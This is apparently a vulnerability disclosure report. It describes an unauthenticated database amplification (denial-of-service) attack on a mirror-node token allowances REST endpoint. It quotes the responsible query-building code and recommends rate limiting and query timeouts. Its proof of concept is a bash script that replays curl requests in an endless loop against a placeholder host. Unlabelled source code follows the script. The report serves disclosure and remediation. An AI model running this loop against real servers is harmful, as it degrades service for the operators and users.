### Title
Unauthenticated Sustained 3-Subquery UNION ALL Amplification via Pagination on Token Allowances Endpoint

### Summary
The `/api/v1/accounts/{id}/allowances/tokens` endpoint generates a 3-subquery UNION ALL SQL query whenever both `spender.id` and `token.id` have closed ranges (lower + upper bounds). The pagination `next` link emitted by the server naturally re-encodes these closed ranges on every page, meaning an unprivileged attacker can follow pagination links indefinitely to continuously force the most expensive query path. The REST API has no rate limiting, making this a sustained, low-effort database amplification attack.

### Finding Description

**Exact code path:**

In `rest/service/tokenAllowanceService.js` lines 63–75, `getQuery()` builds up to 3 subqueries:

```js
const subQueries = [lower, inner, upper]
  .filter((filters) => filters.length !== 0)
  .map((filters) => this.getSubQuery(filters, params, accountIdCondition, limitClause, orderClause));
// ...
sqlQuery = [subQueries.map((q) => `(${q})`).join('\nunion all\n'), orderClause, limitClause].join('\n');
```

Each subquery has its own `ORDER BY` + `LIMIT $2`, and the outer query adds another `ORDER BY` + `LIMIT $2`. With `limit=100`, the DB can process up to 300 rows before the outer merge.

**Trigger condition:** `getLowerFilters`, `getInnerFilters`, and `getUpperFilters` in `rest/controllers/baseController.js` (lines 131–183) all return non-empty arrays when both `spender.id` and `token.id` have closed ranges (gte+lte on spender, gt+lt on token). This is exactly the shape of every `next` link the server emits after the first paginated request with a spender range, as confirmed by test fixtures:

```
/api/v1/accounts/1001/allowances/tokens?spender.id=lte:3102&spender.id=gte:0.0.2001&token.id=lt:10006&token.id=gt:0.0.10006&limit=2
```

**No rate limiting:** `rest/server.js` applies only `authHandler` (lines 85–86), which only sets a custom response-size limit for authenticated users — it does not throttle request rate. The `ThrottleConfiguration`/`ThrottleManagerImpl` classes exist only in the `web3` module for contract calls, not in the `rest` module. There is no per-IP or global request-rate limiter on this endpoint.

**Root cause / failed assumption:** The design assumes pagination is driven by legitimate clients traversing a finite result set. It does not account for an attacker who continuously re-issues the same closed-range paginated request (or follows next links in a tight loop), since each such request unconditionally executes the 3-subquery UNION ALL path with no throttle guard.

### Impact Explanation

Each 3-subquery UNION ALL request causes the database to execute three independent index scans with sort and limit, then merge and re-sort. This is approximately 3× the I/O and CPU cost of a simple single-subquery request. An attacker targeting an account with many token allowances (or cycling across multiple accounts) can sustain this load indefinitely. Because the REST API is public and unauthenticated, a single attacker with a modest request rate (e.g., 10–20 req/s) can push database CPU and I/O well above the 30% threshold relative to a baseline of normal mixed traffic.

### Likelihood Explanation

No special privileges, credentials, or knowledge of internal state are required. The attacker only needs:
1. Any valid account ID with token allowances (publicly discoverable via the same API).
2. An initial request with `spender.id=gte:1&spender.id=lte:999999999&token.id=gte:1&token.id=lte:999999999&limit=1` to obtain the first `next` link.
3. A simple loop following `next` links or re-issuing the same closed-range request.

This is fully automatable with a single HTTP client script and requires no brute-force volume — a moderate sustained rate is sufficient.

### Recommendation

1. **Add rate limiting to the REST API**: Introduce a per-IP (or global) request-rate limiter middleware in `rest/server.js` (e.g., `express-rate-limit`) applied before route handlers, analogous to the `ThrottleManagerImpl` already used in the `web3` module.
2. **Add a DB query timeout**: Enforce a per-query execution timeout in `rest/service/baseService.js` so that expensive UNION ALL queries cannot hold DB connections indefinitely.
3. **Optionally cap the spender/token range width**: Reject or warn when the difference between `spender.id` lower and upper bounds exceeds a configurable threshold, reducing the scan range per subquery.

### Proof of Concept

```bash
# Step 1: Trigger the 3-subquery path with a closed range on both dimensions
curl "https://<mirror-node>/api/v1/accounts/0.0.1001/allowances/tokens?\
spender.id=gte:1&spender.id=lte:999999999&\
token.id=gte:1&token.id=lte:999999999&limit=1"

# Step 2: Extract the `next` link from the response (it will have the same closed-range shape)
# Step 3: Loop indefinitely following next links — each page triggers the 3-subquery UNION ALL path
while true; do
  NEXT=$(curl -s "$URL" | jq -r '.links.next')
  [ "$NEXT" = "null" ] && break
  URL="https://<mirror-node>$NEXT"
done

# Or simply replay the same closed-range request in a tight loop:
while true; do
  curl -s "https://<mirror-node>/api/v1/accounts/0.0.1001/allowances/tokens?\
spender.id=gte:1&spender.id=lte:999999999&\
token.id=gte:1&token.id=lte:999999999&limit=100" > /dev/null
done
```

  getInnerFilters(bounds) {
    const {primary, secondary} = bounds;
    if (!primary.hasBound() || !secondary.hasBound()) {
      return [];
    }

    return [
      // if secondary has lower bound, the primary filter should be > ?
      {filter: primary.lower, newOperator: secondary.hasLower() ? utils.opsMap.gt : null},
      // if secondary has upper bound, the primary filter should be < ?
      {filter: primary.upper, newOperator: secondary.hasUpper() ? utils.opsMap.lt : null},
    ]
      .filter((f) => !isNil(f.filter))
      .map((f) => ({...f.filter, operator: f.newOperator || f.filter.operator}));
  }

  /**
   * Gets filters for the upper part of the multi-union query
   *
   * @param {Bound}[] Bounds
   * @return {{key: string, operator: string, value: *}[]}
   */
  getUpperFilters(bounds) {
    const {primary, secondary} = bounds;
    if (!primary.hasUpper() || !secondary.hasUpper()) {
      return [];
    }
    // the upper part should always have primary filter = ?
    return [{...primary.upper, operator: utils.opsMap.eq}, secondary.upper];
  }
